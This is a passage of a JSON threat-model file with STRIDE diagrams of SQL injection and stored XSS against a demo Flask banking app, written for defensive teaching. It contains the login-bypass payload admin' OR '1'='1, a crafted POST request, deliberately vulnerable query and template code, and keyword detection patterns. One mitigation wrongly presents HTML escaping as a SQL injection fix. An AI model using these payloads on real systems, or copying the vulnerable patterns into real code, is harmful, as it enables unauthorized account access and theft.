            "ports": {
              "groups": {
                "top": {
                  "position": "top",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "right": {
                  "position": "right",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "bottom": {
                  "position": "bottom",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "left": {
                  "position": "left",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                }
              },
              "items": [
                {
                  "group": "top",
                  "id": "0197d456-7449-40c9-a0d2-890946c3349f"
                },
                {
                  "group": "right",
                  "id": "803cbeed-f195-4eee-ad1d-2a95240a6427"
                },
                {
                  "group": "bottom",
                  "id": "3cff3394-4e42-43bf-ab2f-28d3736a7c08"
                },
                {
                  "group": "left",
                  "id": "86b4c50d-05f0-4aeb-816b-a44c5fec5500"
                }
              ]
            },
            "id": "4195aa25-fc53-4c2a-bfd7-1f56e2cb628f",
            "zIndex": 4,
            "data": {
              "type": "tm.Store",
              "name": "SQLite Database",
              "description": "Database storing user credentials and account information\n   \n   Table: users\n   Columns: user_id, username, password_hash, email, account_balance",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "isALog": false,
              "isEncrypted": false,
              "isSigned": false,
              "storesCredentials": false,
              "storesInventory": false,
              "threats": []
            },
            "children": [
              "e9de625f-ba82-438f-9e73-20548068b23d"
            ]
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "red",
                "strokeWidth": 2.5,
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "Vulnerable SQL Query (String Concatenation)",
              "description": "VULNERABILITY LOCATION\n   \n   SQL query constructed using dangerous string concatenation\n   \n   Vulnerable Code:\n   query = f\"SELECT * FROM users WHERE username='{username}' AND password='{password}'\"\n   \n   When Attacker inputs username: admin' OR '1'='1\n   The query becomes:\n   SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'\n   \n   Result: '1'='1' is always TRUE, bypassing authentication\n   \n   Protocol: SQL\n   Encrypted: NO (internal communication)",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": true,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "",
              "threats": [
                {
                  "id": "817c4333-0d0e-40ab-abf0-b4d8a8ac88b0",
                  "title": "SQL Injection in Login Authentication - Bypassing Password Check",
                  "status": "Open",
                  "severity": "High",
                  "type": "Tampering",
                  "description": "VULNERABILITY DESCRIPTION:\nThe login endpoint constructs SQL queries using string concatenation instead of parameterized queries, allowing attackers to inject malicious SQL code.\n\nATTACK VECTOR:\nAttacker submits specially crafted input in the username field:\nUsername: admin' OR '1'='1\nPassword: anything\n\nVULNERABLE CODE:\nquery = f\"SELECT * FROM users WHERE username='{username}' AND password='{password}'\"\n\nRESULTING QUERY:\nSELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'\n\nEXPLOITATION:\n- The injected OR '1'='1' makes the WHERE clause always evaluate to TRUE\n- Password check is bypassed\n- Database returns admin user record\n- Application grants authenticated session to attacker\n\nIMPACT:\n- Complete authentication bypass\n- Unauthorized admin access\n- Access to all customer accounts\n- Ability to transfer funds\n- Access to sensitive PII data\n- Potential for privilege escalation",
                  "mitigation": "IMMEDIATE FIXES:\n1. Use Parameterized Queries (Prepared Statements):\n   cursor.execute(\n       \"SELECT * FROM users WHERE username=? AND password=?\", \n       (username, hash_password(password))\n   )\n\n2. Use ORM Framework:\n   user = User.query.filter_by(username=username).first()\n   if user and check_password_hash(user.password, password):\n       login_user(user)\n\n3. Input Validation:\n   - Whitelist allowed characters (alphanumeric + limited special chars)\n   - Reject SQL keywords: SELECT, OR, AND, DROP, etc.\n   - Limit input length: username max 50 chars\n\nADDITIONAL SECURITY LAYERS:\n4. Web Application Firewall (WAF):\n   - Deploy ModSecurity or cloud WAF\n   - Block common SQL injection patterns\n\n5. Rate Limiting:\n   - Max 5 login attempts per IP per minute\n   - Account lockout after 10 failed attempts\n\n6. Database Security:\n   - Apply principle of least privilege\n   - Use read-only user for SELECT queries\n   - Separate user for INSERT/UPDATE/DELETE\n\n7. Monitoring & Logging:\n   - Log all authentication attempts\n   - Alert on suspicious patterns (SQL keywords in input)\n   - Implement SIEM integration\n\n8. Code Review:\n   - Security code review before deployment\n   - Static analysis tools (Bandit, SonarQube)\n   - Regular penetration testing",
                  "modelType": "STRIDE",
                  "new": false,
                  "number": 6,
                  "score": ""
                }
              ],
              "threatFrequency": {
                "tampering": 1,
                "informationDisclosure": 0,
                "denialOfService": 0
              }
            },
            "labels": [
              "Vulnerable SQL Query (String Concatenation)"
            ],
            "id": "aeb8b14e-36cc-42c2-9ed8-4d4ef1875475",
            "source": {
              "cell": "b8530cee-4bd5-402e-913a-c34ded2e31d1",
              "port": "3952c5eb-a031-45cf-8c52-dfb7358dd5a5"
            },
            "target": {
              "cell": "4195aa25-fc53-4c2a-bfd7-1f56e2cb628f",
              "port": "86b4c50d-05f0-4aeb-816b-a44c5fec5500"
            },
            "vertices": [
              {
                "x": 1110,
                "y": 195
              },
              {
                "x": 1150,
                "y": 195
              }
            ]
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "red",
                "strokeWidth": 2.5,
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "Malicious SQL Injection Payload",
              "description": "HTTP POST request containing SQL injection payload\n   \n   Payload Details:\n   - Username: admin' OR '1'='1\n   - Password: anything\n   - Content-Type: application/x-www-form-urlencoded\n   \n   The payload exploits string concatenation vulnerability in SQL query construction",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": true,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "",
              "threats": [
                {
                  "id": "509c88ca-e968-4ec0-8b1a-d5b96507fc14",
                  "title": "Malicious Payload Injection via POST Request",
                  "status": "Open",
                  "severity": "High",
                  "type": "Tampering",
                  "description": "ATTACK VECTOR:\nAttacker crafts malicious HTTP POST request with SQL injection payload embedded in the username field.\n\nPAYLOAD DETAILS:\n- Field: username\n- Malicious Input: admin' OR '1'='1\n- Normal Input Expected: alphanumeric username\n- Attack Type: SQL Injection via input tampering\n\nREQUEST STRUCTURE:\nPOST /auth/login HTTP/1.1\nHost: bank.example.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin' OR '1'='1&password=anything\n\nTAMPERING METHOD:\nAttacker tampers with legitimate login request by injecting SQL syntax characters (' OR) that will be interpreted as SQL code instead of data.\n\nTHREAT:\nThe application does not distinguish between user data and SQL commands, allowing attacker to modify the application's SQL query logic.",
                  "mitigation": "INPUT LAYER PROTECTION:\n\n1. Input Validation (Client & Server Side):\n   - Whitelist: Allow only [a-zA-Z0-9_] characters\n   - Length limit: 3-50 characters\n   - Reject special SQL characters: ' \" ; -- /* */ \n\n2. Web Application Firewall (WAF):\n   - Deploy ModSecurity or cloud WAF (Cloudflare, AWS WAF)\n   - Enable OWASP Core Rule Set (CRS)\n   - Block SQL injection patterns\n   - Rate limiting per IP\n\n3. Content Security Policy:\n   - Validate Content-Type header\n   - Reject unexpected content types\n   - Check request origin\n\n4. Request Sanitization:\n   from html import escape\n   username = escape(username)\n   # Converts ' to &apos; preventing SQL injection\n\n5. Logging & Monitoring:\n   - Log all login attempts with full payload\n   - Alert on SQL keywords in input: SELECT, OR, AND, DROP, UNION\n   - Integrate with SIEM (Security Information and Event Management)\n   - Set up anomaly detection\n\n6. HTTPS Enforcement:\n   - Force HTTPS to prevent MITM tampering\n   - HSTS header: Strict-Transport-Security: max-age=31536000\n\n7. CSRF Protection:\n   - Implement CSRF tokens\n   - Validate tokens on every POST request",
                  "modelType": "STRIDE",
                  "new": false,
                  "number": 8,
                  "score": ""
                }
              ],
              "threatFrequency": {
                "tampering": 1,
                "informationDisclosure": 0,
                "denialOfService": 0
              }
            },
            "labels": [
              "Malicious SQL Injection Payload"
            ],
            "id": "540aa1ac-0f4a-4e96-aa7f-73f27b96e940",
            "source": {
              "cell": "ac0a552a-84d4-4657-bb64-8ec10af73ed0",
              "port": "26b6ab31-e752-4a97-883a-91be2433584d"
            },
            "target": {
              "cell": "b8530cee-4bd5-402e-913a-c34ded2e31d1",
              "port": "8dcaf22d-70d0-43f5-adad-49541a9c7c97"
            },
            "vertices": [
              {
                "x": 540,
                "y": 140
              },
              {
                "x": 570,
                "y": 160
              },
              {
                "x": 590,
                "y": 175
              }
            ]
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "#333333",
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "Query Results (User Record)",
              "description": "Database returns user record to application\n   \n   Returned Data:\n   - user_id: 1\n   - username: admin\n   - email: admin@bank.com\n   - account_type: administrator\n   \n   Due to SQL injection, database returns admin record even with wrong password",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "",
              "threats": []
            },
            "labels": [
              "Query Results (User Record)"
            ],
            "id": "2d518d58-060c-49d0-8665-3318a85ff2ba",
            "source": {
              "cell": "4195aa25-fc53-4c2a-bfd7-1f56e2cb628f",
              "port": "3cff3394-4e42-43bf-ab2f-28d3736a7c08"
            },
            "target": {
              "cell": "b8530cee-4bd5-402e-913a-c34ded2e31d1",
              "port": "3952c5eb-a031-45cf-8c52-dfb7358dd5a5"
            },
            "vertices": [
              {
                "x": 1170,
                "y": 300
              }
            ]
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "#333333",
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "HTTP Response - Unauthorized Access Granted",
              "description": "Application grants authenticated session to attacker\n   \n   Response Details:\n   - Status: 302 Found (Redirect)\n   - Location: /dashboard\n   - Set-Cookie: session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0...\n   - Body: Redirecting to admin dashboard\n   \n   IMPACT: Attacker now has full admin access to banking system",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "",
              "threats": []
            },
            "labels": [
              "HTTP Response - Unauthorized Access Granted"
            ],
            "id": "1a866ff4-0182-4112-a14e-d33ff69e3d09",
            "source": {
              "cell": "b8530cee-4bd5-402e-913a-c34ded2e31d1",
              "port": "09c79237-1bfa-4aca-94bf-11511a356e3a"
            },
            "target": {
              "cell": "ac0a552a-84d4-4657-bb64-8ec10af73ed0",
              "port": "26b6ab31-e752-4a97-883a-91be2433584d"
            },
            "vertices": []
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "#333333",
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "HTTP Response - Legitimate Login",
              "description": "Normal successful authentication response for legitimate users\nResponse: 302 redirect to /dashboard with session cookie",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "",
              "threats": []
            },
            "labels": [
              "HTTP Response - Legitimate Login"
            ],
            "id": "92735b87-2233-436b-900a-b46f5c508bcc",
            "source": {
              "cell": "b8530cee-4bd5-402e-913a-c34ded2e31d1",
              "port": "8dcaf22d-70d0-43f5-adad-49541a9c7c97"
            },
            "target": {
              "cell": "dedcf4c0-3e7c-4492-9451-5db79c8f8803",
              "port": "26b6ab31-e752-4a97-883a-91be2433584d"
            },
            "vertices": []
          },
          {
            "position": {
              "x": 760,
              "y": -230
            },
            "size": {
              "width": 480,
              "height": 210
            },
            "attrs": {
              "text": {
                "text": "SQL INJECTION ATTACK FLOW - BANKING APPLICATION\n\nATTACK SCENARIO:\n1. Attacker accesses login page at /auth/login\n2. Attacker inputs malicious payload: Username = admin' OR '1'='1\n3. Flask app constructs vulnerable SQL query using string concatenation\n4. Database executes injected query, returns admin user record\n5. Attacker receives authenticated session with admin privileges\n6. Attacker gains unauthorized access to banking system\n\nSEVERITY: HIGH | CVSS Score: 9.8 (Critical)\nSTRIDE: Tampering, Information Disclosure, Elevation of Privilege"
              }
            },
            "visible": true,
            "shape": "td-text-block",
            "id": "5e9d8330-6327-4540-b327-7e053af48c79",
            "zIndex": 11,
            "data": {
              "type": "tm.Text",
              "name": "SQL INJECTION ATTACK FLOW - BANKING APPLICATION\n\nATTACK SCENARIO:\n1. Attacker accesses login page at /auth/login\n2. Attacker inputs malicious payload: Username = admin' OR '1'='1\n3. Flask app constructs vulnerable SQL query using string concatenation\n4. Database executes injected query, returns admin user record\n5. Attacker receives authenticated session with admin privileges\n6. Attacker gains unauthorized access to banking system\n\nSEVERITY: HIGH | CVSS Score: 9.8 (Critical)\nSTRIDE: Tampering, Information Disclosure, Elevation of Privilege",
              "hasOpenThreats": false
            }
          },
          {
            "position": {
              "x": 1499.999999999999,
              "y": 85
            },
            "size": {
              "width": 330,
              "height": 340
            },
            "attrs": {
              "text": {
                "text": "IMPACT ANALYSIS:\n\nConfidentiality: HIGH\n- Access to all customer PII\n- View account balances\n- Access transaction history\n\nIntegrity: HIGH  \n- Modify account balances\n- Create fraudulent transactions\n- Alter audit logs\n\nAvailability: MEDIUM\n- Potential for account lockouts\n- Database manipulation\n- Service disruption\n\nFinancial Impact:\n- Direct theft via unauthorized transfers\n- Regulatory fines (GDPR, PCI-DSS)\n- Reputation damage\n- Legal liability"
              }
            },
            "visible": true,
            "shape": "td-text-block",
            "id": "d1bb5030-be33-4151-bf5e-f826358dcd5c",
            "zIndex": 12,
            "data": {
              "type": "tm.Text",
              "name": "IMPACT ANALYSIS:\n\nConfidentiality: HIGH\n- Access to all customer PII\n- View account balances\n- Access transaction history\n\nIntegrity: HIGH  \n- Modify account balances\n- Create fraudulent transactions\n- Alter audit logs\n\nAvailability: MEDIUM\n- Potential for account lockouts\n- Database manipulation\n- Service disruption\n\nFinancial Impact:\n- Direct theft via unauthorized transfers\n- Regulatory fines (GDPR, PCI-DSS)\n- Reputation damage\n- Legal liability",
              "hasOpenThreats": false
            }
          }
        ]
      },
      {
        "id": 2,
        "title": "CROSS-SITE SCRIPTING (XSS) ATTACK THREAT MODEL",
        "diagramType": "STRIDE",
        "placeholder": "New STRIDE diagram description",
        "thumbnail": "./public/content/images/thumbnail.stride.jpg",
        "version": "2.5.0",
        "cells": [
          {
            "position": {
              "x": 579.999999999998,
              "y": 150.00000000000603
            },
            "size": {
              "width": 830,
              "height": 360
            },
            "attrs": {
              "label": {
                "text": "HTTPS Trust Boundary"
              }
            },
            "visible": true,
            "shape": "trust-boundary-box",
            "id": "58241417-983d-4b30-bd1a-47bb32b7a5b3",
            "zIndex": -1,
            "data": {
              "type": "tm.BoundaryBox",
              "name": "HTTPS Trust Boundary",
              "description": "Security boundary between external browsers and internal application infrastructure",
              "isTrustBoundary": true,
              "hasOpenThreats": false
            }
          },
          {
            "position": {
              "x": 320,
              "y": 95
            },
            "size": {
              "width": 112.5,
              "height": 60
            },
            "attrs": {
              "text": {
                "text": "Attacker"
              },
              "body": {
                "stroke": "#333333",
                "strokeWidth": 1.5,
                "strokeDasharray": null
              }
            },
            "visible": true,
            "shape": "actor",
            "ports": {
              "groups": {
                "top": {
                  "position": "top",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "right": {
                  "position": "right",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "bottom": {
                  "position": "bottom",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "left": {
                  "position": "left",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                }
              },
              "items": [
                {
                  "group": "top",
                  "id": "1a798fe2-f66c-466f-9a2f-50fc06c86d61"
                },
                {
                  "group": "right",
                  "id": "6212f4fc-f46a-4c41-bdf8-e28f08355796"
                },
                {
                  "group": "bottom",
                  "id": "3b0008d1-d3c4-4676-afbd-53c792d6eaa6"
                },
                {
                  "group": "left",
                  "id": "785501fb-dd97-447d-bc61-28eef2f2c6b0"
                }
              ]
            },
            "id": "cb155b1f-0acb-41a4-b548-1a16c1b09573",
            "zIndex": 1,
            "data": {
              "type": "tm.Actor",
              "name": "Attacker",
              "description": "Malicious user who creates account and injects XSS payload\n   \n   Actions:\n   - Creates account on banking application\n   - Submits malicious JavaScript in profile bio field\n   - Waits for victim to view profile\n   - Potentially receives stolen session cookies",
              "isTrustBoundary": false,
              "outOfScope": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "providesAuthentication": false,
              "threats": []
            }
          },
          {
            "position": {
              "x": 260,
              "y": 335
            },
            "size": {
              "width": 150,
              "height": 50
            },
            "attrs": {
              "text": {
                "text": "Victim User (Admin)"
              },
              "body": {
                "stroke": "#333333",
                "strokeWidth": 1.5,
                "strokeDasharray": null
              }
            },
            "visible": true,
            "shape": "actor",
            "ports": {
              "groups": {
                "top": {
                  "position": "top",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "right": {
                  "position": "right",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "bottom": {
                  "position": "bottom",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "left": {
                  "position": "left",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                }
              },
              "items": [
                {
                  "group": "top",
                  "id": "1a798fe2-f66c-466f-9a2f-50fc06c86d61"
                },
                {
                  "group": "right",
                  "id": "6212f4fc-f46a-4c41-bdf8-e28f08355796"
                },
                {
                  "group": "bottom",
                  "id": "3b0008d1-d3c4-4676-afbd-53c792d6eaa6"
                },
                {
                  "group": "left",
                  "id": "785501fb-dd97-447d-bc61-28eef2f2c6b0"
                }
              ]
            },
            "id": "6497cfd5-26b2-4e30-8ada-2c3912e23804",
            "zIndex": 2,
            "data": {
              "type": "tm.Actor",
              "name": "Victim User (Admin)",
              "description": "Legitimate user with administrative privileges\n   \n   Scenario:\n   - Logs into banking application\n   - Reviews user profiles (admin duty)\n   - Views attacker's profile\n   - Browser executes malicious script\n   - Session cookies potentially stolen",
              "isTrustBoundary": false,
              "outOfScope": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "providesAuthentication": false,
              "threats": []
            },
            "children": [
              "e662cd40-589b-467f-bb98-fc5628ed92a5"
            ]
          },
          {
            "position": {
              "x": 670,
              "y": 240
            },
            "size": {
              "width": 230,
              "height": 240
            },
            "attrs": {
              "text": {
                "text": "Flask Web Application - Profile Route"
              },
              "body": {
                "stroke": "red",
                "strokeWidth": 2.5,
                "strokeDasharray": null
              }
            },
            "visible": true,
            "shape": "process",
            "ports": {
              "groups": {
                "top": {
                  "position": "top",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "right": {
                  "position": "right",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "bottom": {
                  "position": "bottom",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "left": {
                  "position": "left",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                }
              },
              "items": [
                {
                  "group": "top",
                  "id": "3fbdf71f-ff76-4b28-8835-3cf286ce469a"
                },
                {
                  "group": "right",
                  "id": "77f25a37-cb54-44fa-a3ab-efcb7b31eecc"
                },
                {
                  "group": "bottom",
                  "id": "e5ab90b2-c548-497a-b7b6-cc850580bbbd"
                },
                {
                  "group": "left",
                  "id": "af3d325d-c9d3-4853-9ee4-89d026036626"
                }
              ]
            },
            "id": "b09cca8d-3d9d-440c-b87c-b16a383db8c4",
            "zIndex": 3,
            "data": {
              "type": "tm.Process",
              "name": "Flask Web Application - Profile Route",
              "description": "Web application endpoint handling user profile display and updates\n   Endpoint: /profile (GET and POST methods)\n   \n   VULNERABLE CODE:\n   \n   # Profile update (POST)\n   @app.route('/profile', methods=['POST'])\n   def update_profile():\n       bio = request.form['bio']\n       # NO SANITIZATION - Stores raw input\n       cursor.execute(f\"UPDATE users SET bio='{bio}' WHERE user_id={user_id}\")\n       \n   # Profile display (GET)  \n   @app.route('/profile/<username>')\n   def view_profile(username):\n       user = get_user(username)\n       # VULNERABLE: |safe filter disables escaping\n       return render_template('profile.html', user=user)\n   \n   # In template: {{ user.bio|safe }}\n   \n   VULNERABILITIES:\n   1. No input sanitization on bio field\n   2. Jinja2 |safe filter allows script execution\n   3. No Content Security Policy (CSP)\n   4. No XSS protection headers",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": true,
              "handlesCardPayment": false,
              "handlesGoodsOrServices": false,
              "isWebApplication": true,
              "privilegeLevel": "",
              "threats": [
                {
                  "id": "522187ba-3903-494d-9206-9adcdaab784e",
                  "title": "Insufficient XSS Protection in Profile Endpoint",
                  "status": "Open",
                  "severity": "High",
                  "type": "Tampering",
                  "description": "VULNERABILITY SUMMARY:\nThe profile route lacks multiple XSS protection mechanisms:\n\nMISSING PROTECTIONS:\n1. No input validation on bio field\n2. No content sanitization before storage\n3. No output encoding before rendering\n4. Uses dangerous |safe filter in templates\n5. No Content-Security-Policy header\n6. No X-XSS-Protection header\n7. Cookies not marked HttpOnly\n8. No rate limiting on profile updates\n\nVULNERABLE ENDPOINTS:\n- POST /profile (stores unsanitized input)\n- GET /profile/<username> (renders with |safe)\n\nEXPLOITABLE FIELDS:\n- bio (TEXT, unlimited, no validation)\n\nATTACK SURFACE:\nAny user can inject XSS in their bio and affect all users who view their profile.\n\nPRIVILEGE ESCALATION RISK:\nIf admin views attacker profile, admin session can be hijacked, leading to complete system compromise.",
                  "mitigation": "COMPREHENSIVE XSS PROTECTION:\n\n1. Input Validation Framework:\n   from wtforms import Form, StringField, validators\n   from wtforms.validators import Length, Regexp\n   \n   class ProfileForm(Form):\n       bio = StringField('Bio', [\n           Length(min=0, max=500),\n           Regexp(r'^[a-zA-Z0-9\\s.,!?-]*$', \n                  message='Invalid characters in bio')\n       ])\n\n2. Content Sanitization:\n   import bleach\n   from bleach.css_sanitizer import CSSSanitizer\n   \n   css_sanitizer = CSSSanitizer(allowed_css_properties=['color'])\n   \n   def sanitize_bio(bio):\n       return bleach.clean(\n           bio,\n           tags=['b', 'i', 'u', 'p', 'br'],\n           attributes={},\n           css_sanitizer=css_sanitizer,\n           strip=True\n       )\n\n3. Template Auto-Escape:\n   # config.py\n   class Config:\n       JINJA_AUTOESCAPE = True\n   \n   # Remove all |safe filters from templates\n   # Use Markup() only for admin-generated content\n\n4. Security Headers Middleware:\n   @app.after_request\n   def set_security_headers(response):\n       response.headers['Content-Security-Policy'] = \\\n           \"default-src 'self'; script-src 'self'\"\n       response.headers['X-Content-Type-Options'] = 'nosniff'\n       response.headers['X-Frame-Options'] = 'DENY'\n       response.headers['X-XSS-Protection'] = '1; mode=block'\n       return response\n\n5. HttpOnly Cookies:\n   app.config['SESSION_COOKIE_HTTPONLY'] = True\n   app.config['SESSION_COOKIE_SECURE'] = True\n   app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'\n\n6. Rate Limiting:\n   from flask_limiter import Limiter\n   \n   limiter = Limiter(app, key_func=get_remote_address)\n   \n   @app.route('/profile', methods=['POST'])\n   @limiter.limit(\"5 per minute\")\n   def update_profile():\n       ...\n\n7. Security Testing:\n   - Automated XSS scanning with OWASP ZAP\n   - Manual penetration testing\n   - Code review for |safe usage\n   - Input fuzzing with XSS payloads\n\n8. Monitoring & Logging:\n   import logging\n   \n   @app.route('/profile', methods=['POST'])\n   def update_profile():\n       bio = request.form['bio']\n       \n       # Log suspicious patterns\n       if '<script' in bio.lower() or 'javascript:' in bio.lower():\n           logging.warning(f\"XSS attempt from {request.remote_addr}: {bio}\")",
                  "modelType": "STRIDE",
                  "new": false,
                  "number": 11,
                  "score": ""
                }
              ],
              "threatFrequency": {
                "spoofing": 0,
                "tampering": 1,
                "repudiation": 0,
                "informationDisclosure": 0,
                "denialOfService": 0,
                "elevationOfPrivilege": 0
              }
            }
          },
          {
            "position": {
              "x": 1150,
              "y": 330
            },
            "size": {
              "width": 220,
              "height": 60
            },
            "attrs": {
              "text": {
                "text": "SQLite Database (users table)"
              },
              "topLine": {
                "strokeWidth": 1.5,
                "strokeDasharray": null
              },
              "bottomLine": {
                "strokeWidth": 1.5,
                "strokeDasharray": null
              }
            },
            "visible": true,
            "shape": "store",
            "ports": {
              "groups": {
                "top": {
                  "position": "top",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "right": {
                  "position": "right",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "bottom": {
                  "position": "bottom",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "left": {
                  "position": "left",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                }
              },
              "items": [
                {
                  "group": "top",
                  "id": "0a89cb8c-f0f5-44f8-b01c-2bc68a53d694"
                },
                {
                  "group": "right",
                  "id": "58d6db7d-30c5-484f-a318-156150200c7f"
                },
                {
                  "group": "bottom",
                  "id": "36e889d3-eb6a-4903-9f95-df14999e436a"
                },
                {
                  "group": "left",
                  "id": "d804e976-0b48-407a-8754-ee57896ee000"
                }
              ]
            },
            "id": "0ab333fe-7fc1-4d9c-8119-0b4980110ea0",
            "zIndex": 4,
            "data": {
              "type": "tm.Store",
              "name": "SQLite Database (users table)",
